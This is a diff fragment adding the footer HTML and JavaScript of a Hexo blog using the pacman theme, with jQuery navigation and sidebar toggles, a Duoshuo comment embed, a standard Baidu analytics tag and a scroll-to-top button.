+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="pacman">pacman</a> © 2016 
+		
+		<a href="http://ha.cker.in" target="_blank" title="Secer">Secer</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:"dreajaygithubblog"};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+var _bdhmProtocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+document.write(unescape("%3Cscript src='" + _bdhmProtocol + "hm.baidu.com/h.js%3F77edef7e6931022edbd2322ec66456e1' type='text/javascript'%3E%3C/script%3E"));
+</script>
+
+<div id="totop" style="position:fixed;bottom:150px;right:50px;cursor: pointer;">
+	<a title="返回顶部"><img src="/img/scrollup.png"/></a>
+</div>
+<script type="text/javascript">
+	(function($) { 
+		// When to show the scroll link
+		// higher number = scroll link appears further down the page   
+		var upperLimit = 300;
+		
+		// Our scroll link element
+		var scrollElem = $('#totop');
+	   
+		// Scroll to top speed
+		var scrollSpeed = 800;
+	   
+		// Show and hide the scroll to top link based on scroll position   
+		scrollElem.hide();
+		$(window).scroll(function () {            
+			var scrollTop = $(document).scrollTop();       
+			if ( scrollTop > upperLimit ) {
+				$(scrollElem).stop().fadeTo(300, 1); // fade back in           
+			}else{       
+				$(scrollElem).stop().fadeTo(300, 0); // fade out
+			}
+		});
+		// Scroll to top animation on click
+		$(scrollElem).click(function(){
+			$('html, body').animate({scrollTop:0}, scrollSpeed); return false;
+		});
+	})(jQuery);
+</script>
+
+
+  </body>
 </html>
+
